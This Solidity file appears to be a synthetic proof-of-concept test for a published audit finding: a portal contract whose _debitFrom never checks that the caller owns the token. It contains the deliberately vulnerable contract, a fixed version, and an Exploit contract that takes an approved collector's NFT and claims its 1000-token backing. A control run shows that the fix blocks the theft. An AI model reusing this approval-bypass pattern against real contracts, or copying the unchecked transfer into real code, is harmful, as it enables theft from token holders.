// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bearcave HoneyJarPortal — C-01 missing owner check (Pashov, 2023-03).
    SYNTHETIC, cheatcode-free. _debitFrom is the quoted body.

    sendFrom is public. _debitFrom pulls tokenId with safeTransferFrom and
    never checks msg.sender. A collector who approved the portal can have
    their jar taken by anyone, who then claims the 1000 USDC backing it.
    The control requires ownerOf(tokenId) == msg.sender. */

contract PaymentToken {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HoneyJar {
    PaymentToken public pay;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public backing;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    constructor(PaymentToken pay_) {
        pay = pay_;
    }

    function mint(address to, uint256 id, uint256 value) external {
        ownerOf[id] = to;
        backing[id] = value;
        pay.mint(address(this), value);
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
    }

    function safeTransferFrom(address from, address to, uint256 id) external {
        address owner = ownerOf[id];
        require(owner == from, "from");
        require(msg.sender == owner || isApprovedForAll[owner][msg.sender], "approval");
        ownerOf[id] = to;
        if (to.code.length > 0) {
            require(
                IERC721Receiver(to).onERC721Received(msg.sender, from, id, "")
                    == IERC721Receiver.onERC721Received.selector,
                "receiver"
            );
        }
    }

    function claim(uint256 id) external {
        require(ownerOf[id] == msg.sender, "not owner");
        uint256 amount = backing[id];
        backing[id] = 0;
        pay.transfer(msg.sender, amount);
    }
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 id, bytes calldata data)
        external
        returns (bytes4);
}

contract HoneyJarPortal is IERC721Receiver {
    HoneyJar public honeyJar;

    constructor(HoneyJar jar_) {
        honeyJar = jar_;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function sendFrom(address _from, uint16 _dstChainId, bytes calldata _toAddress, uint256 _tokenId) external payable {
        _debitFrom(_from, _dstChainId, _toAddress, _tokenId);
        address to;
        assembly {
            to := shr(96, calldataload(_toAddress.offset))
        }
        honeyJar.safeTransferFrom(address(this), to, _tokenId);
    }

    // Quoted from HoneyJarPortal._debitFrom.
    function _debitFrom(address _from, uint16, bytes memory, uint256 _tokenId) internal virtual {
        // @> VULN: safeTransferFrom checks the portal's approval, not that msg.sender owns the jar
        honeyJar.safeTransferFrom(_from, address(this), _tokenId);
    }
}

contract HoneyJarPortalFixed is HoneyJarPortal {
    constructor(HoneyJar jar_) HoneyJarPortal(jar_) {}

    function _debitFrom(address _from, uint16 _dst, bytes memory _payload, uint256 _tokenId) internal override {
        require(honeyJar.ownerOf(_tokenId) == msg.sender, "not owner");
        super._debitFrom(_from, _dst, _payload, _tokenId);
    }
}

contract Collector is IERC721Receiver {
    HoneyJar public jar;

    constructor(HoneyJar jar_) {
        jar = jar_;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function approvePortal(address portal) external {
        jar.setApprovalForAll(portal, true);
    }

    function send(HoneyJarPortal portal, address to) external {
        portal.sendFrom(address(this), 1, abi.encodePacked(to), 1);
    }
}

contract Exploit is IERC721Receiver {
    uint256 public constant BACKING = 1000 ether;
    uint256 public constant JAR_ID = 1;

    PaymentToken public pay; // nonce 1
    HoneyJar public jar; // nonce 2
    HoneyJarPortal public portal; // nonce 3
    Collector public collector; // nonce 4

    address public ownerBefore;
    address public ownerAfter;
    uint256 public attackerGot;
    uint256 public jarLeft;

    bool public controlBlocked;
    address public controlOwner;
    bool public controlOwnerSent;
    uint256 public controlBackingLeft;

    constructor() {
        pay = new PaymentToken();
        jar = new HoneyJar(pay);
        portal = new HoneyJarPortal(jar);
        collector = new Collector(jar);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function run() external {
        jar.mint(address(collector), JAR_ID, BACKING);
        ownerBefore = jar.ownerOf(JAR_ID);
        collector.approvePortal(address(portal));
        portal.sendFrom(address(collector), 1, abi.encodePacked(address(this)), JAR_ID);
        ownerAfter = jar.ownerOf(JAR_ID);
        jar.claim(JAR_ID);
        attackerGot = pay.balanceOf(address(this));
        jarLeft = pay.balanceOf(address(jar));
        require(ownerBefore == address(collector), "collector did not start as owner");
        require(ownerAfter == address(this), "attacker did not receive the jar");
        require(attackerGot == BACKING, "attacker did not take the 1000");
        require(jarLeft == 0, "backing still in the jar");
    }

    function runControl() external {
        HoneyJar jar2 = new HoneyJar(pay);
        HoneyJarPortalFixed fixedPortal = new HoneyJarPortalFixed(jar2);
        Collector owner = new Collector(jar2);
        jar2.mint(address(owner), JAR_ID, BACKING);
        owner.approvePortal(address(fixedPortal));
        (bool ok,) = address(fixedPortal).call(
            abi.encodeWithSelector(
                fixedPortal.sendFrom.selector, address(owner), uint16(1), abi.encodePacked(address(this)), JAR_ID
            )
        );
        controlBlocked = !ok;
        controlOwner = jar2.ownerOf(JAR_ID);
        controlBackingLeft = pay.balanceOf(address(jar2));
        owner.send(fixedPortal, address(owner));
        controlOwnerSent = jar2.ownerOf(JAR_ID) == address(owner);
        require(controlBlocked, "attacker send was not blocked");
        require(controlOwner == address(owner), "owner changed before the owner send");
        require(controlBackingLeft == BACKING, "backing moved");
        require(controlOwnerSent, "owner could not send their own jar");
        require(pay.balanceOf(address(this)) == 0, "attacker was paid");
    }
}
